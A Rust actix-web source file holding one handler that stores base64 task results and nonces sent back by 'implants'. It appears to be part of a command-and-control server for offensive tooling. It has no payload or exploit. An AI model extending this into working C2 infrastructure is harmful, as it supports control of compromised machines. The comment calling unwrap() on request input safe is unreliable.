use std::str::FromStr;

use actix_web::{get, post, web, HttpResponse, Responder};
use chrono;
use diesel::prelude::*;
use uuid;

use crate::db::connect::Pool;
use crate::errors::ServerError;

#[post("/api/result/{task_id}")]
pub async fn post_task(
    db: web::Data<Pool>,
    path: web::Path<String>,
    base64_req_body: String,
) -> Result<impl Responder, ServerError> {
    let result_created_at = chrono::Local::now().naive_local();

    let task_id = path.into_inner();

    let mut base64_req_body_lines = base64_req_body.lines();

    // Using unwrap is safe here, because we control the response from server
    // and it is known to the creator
    let base64_result_str = base64_req_body_lines.next().unwrap();
    let base64_nonce_str = base64_req_body_lines.next().unwrap();

    let base64_result = base64_result_str.clone().to_owned();
    let base64_nonce = base64_nonce_str.clone().to_owned();

    // TODO: Implement GET request for all results only for auth user
    // TODO: Find and update implant in implants table
    // TODO: Delete task from tasks endpoint
    // TODO: Decrypt encrypted response

    // Find and update task in tasks table
    web::block(move || update_task(db, base64_result, base64_nonce, result_created_at, task_id))
        .await??;

    Ok(HttpResponse::Ok().finish())
}

fn update_task(
    db: web::Data<Pool>,
    base64_result: String,
    base64_nonce: String,
    result_created_at_arg: chrono::NaiveDateTime,
    task_id: String,
) -> Result<(), ServerError> {
    use crate::schema::tasks::dsl::{result_content, result_created_at, result_nonce, tasks};

    let conn = db.get()?;

    let task_id = uuid::Uuid::from_str(&task_id)?;

    let target = tasks.find(task_id);

    diesel::dsl::update(target)
        .set((
            result_content.eq(base64_result),
            result_nonce.eq(base64_nonce),
            result_created_at.eq(result_created_at_arg),
        ))
        .execute(&conn)?;

    Ok(())
}
